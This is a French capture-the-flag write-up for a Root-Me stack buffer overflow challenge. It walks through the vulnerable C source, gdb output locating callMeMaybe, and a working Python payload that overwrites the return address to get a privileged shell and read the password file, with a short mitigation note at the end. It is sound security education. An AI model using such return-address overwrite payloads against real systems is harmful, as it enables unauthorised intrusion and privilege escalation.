# L’épopée Root-Me : App - Système | ELF x64 - Stack buffer overflow - basic

## 1. Informations Générales & Configuration de l'Environnement

| Protection | Nom complet | État |
| :--- | :--- | :---: |
| **PIE** | Position Independent Executable | [❌] |
| **RelRO** | Read Only relocations | [✔️] |
| **NX** | Pile non exécutable | [✔️] |
| **Heap exec** | Tas non exécutable | [✔️] |
| **ASLR** | Distribution aléatoire de l'espace d'adressage | [✔️] |
| **SF** | Source Fortification | [❌] |
| **SSP** | Stack-Smashing Protection | [❌] |
| **SRC** | Accès au code source | [✔️] |

---

## 2. Analyse du Code Source

```c
    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>
    #include <sys/types.h>
    #include <unistd.h>
     
    /*
    gcc -o ch35 ch35.c -fno-stack-protector -no-pie -Wl,-z,relro,-z,now,-z,noexecstack
    */
     
    void callMeMaybe(){
        char *argv[] = { "/bin/bash", "-p", NULL };
        execve(argv[0], argv, NULL);
    }
     
    int main(int argc, char **argv){
     
        char buffer[256];
        int len, i;
     
        scanf("%s", buffer);
        len = strlen(buffer);
     
        printf("Hello %s\n", buffer);
     
        return 0;
    }
```

### Le challenge :

La première étape de ce challenge va être la lecture du code. Voici les informations notables :

- Une fonction callMeMaybe() qui permet d'avoir un bash privilégié.
- Un buffer de 256 octets ainsi que deux int à la suite.
- Un scanf() pour lire depuis stdin.

Une première faille semble me sauter aux yeux : Un stack buffer overflow comme vu dans les challenges précédents.

---

## 3. Exploitation & Démarche de Résolution

### Étape 1 : Déroulement basique du script

Tout d'abord, on va vérifier le déroulement basique du programme :

```bash
app-systeme-ch35@challenge03:~$ ./ch35 
world!
Hello world!
```

### Étape 2 : Identification de la vulnérabilité

On va tenter comme dans les exercices précédents de d'abord récupérer l'adresse de callMeMaybe() et ensuite de l'injecter.

```bash
app-systeme-ch35@challenge03:~$ gdb ./ch35 
GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./ch35...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000400498  _init
0x00000000004004c0  strlen@plt
0x00000000004004d0  printf@plt
0x00000000004004e0  execve@plt
0x00000000004004f0  __isoc99_scanf@plt
0x0000000000400500  _start
0x0000000000400530  _dl_relocate_static_pie
0x0000000000400540  deregister_tm_clones
0x0000000000400570  register_tm_clones
0x00000000004005b0  __do_global_dtors_aux
0x00000000004005e0  frame_dummy
0x00000000004005e7  callMeMaybe
0x0000000000400628  main
0x0000000000400690  __libc_csu_init
0x0000000000400700  __libc_csu_fini
0x0000000000400704  _fini
(gdb) quit
app-systeme-ch35@challenge03:~$ (python3 -c 'import sys; sys.stdout.buffer.write(256*b"a" + b"\xe7\x05\x40\x00\x00\x00\x00\x00")'; cat) | ./ch35

Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�@
ls
```

Ca n'a pas fonctionné, voyons pourquoi.

### Étape 3 : Analyse du comportement

Deux raisons pour lesquelles ça n'a pas fonctionné :

* J'ai omis la taille de len et de i
* J'ai omis la taille du Saved RBP

Lorsqu'on déborde sur le buffer, il va lire dans l'ordre les variables locales définies après lui dans le code, ici len et i sont des int donc ils font 4 octets chacun mais aussi le padding, en général dans les compilateurs x64 la stack "compte" de 16 en 16 donc pour l'aligner le compilateur va ajouter 8 octets vides. Mais il y a un mécanisme auquel je n'avais pas pensé c'est que dans la stack, avant l'adresse de retour le programme effectue un retour en arrière sur le rbp pour revenir au contexte de l'appelant avant de retourner à l'appelant. En assembleur c'est le combo mov rsp, rbp + pop rbp avant de passer au ret. Et ça prend 8 octets en tout.

### Étape 4 : Exploitation

Maintenant que nous avons trouvé une solution, nous allons essayer d'accéder au shell en comptant cette fois-ci les 24 octets.

```bash
app-systeme-ch35@challenge03:~$ (python3 -c 'import sys; sys.stdout.buffer.write(280 * b"A" + b"\xe7\x05\x40\x00\x00\x00\x00\x00")'; cat) | ./ch35

Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
s -la
total 36
drwxr-x---  2 app-systeme-ch35-cracked app-systeme-ch35         4096 Dec 10  2021 .
drwxr-xr-x 65 root                     root                     4096 Jul  4  2024 ..
-r--------  1 root                     root                      661 Dec 10  2021 ._perms
-rw-r-----  1 root                     root                       44 Dec 10  2021 .git
-r--------  1 app-systeme-ch35-cracked app-systeme-ch35-cracked   32 Dec 10  2021 .passwd
-rwsr-x---  1 app-systeme-ch35-cracked app-systeme-ch35         8272 Dec 10  2021 ch35
-rw-r-----  1 app-systeme-ch35-cracked app-systeme-ch35          474 Dec 10  2021 ch35.c
cat .passwd     
************************************************************
```

Le mot de passe est en poche.

---

## 4. Comment se protéger ?

Ici, l'erreur venait encore une fois du manque de protection dans la lecture avec scanf.

Pour corriger ce problème, la solution est de vérifier la taille de l'entrée pour qu'elle ne dépasse pas celle du buffer.
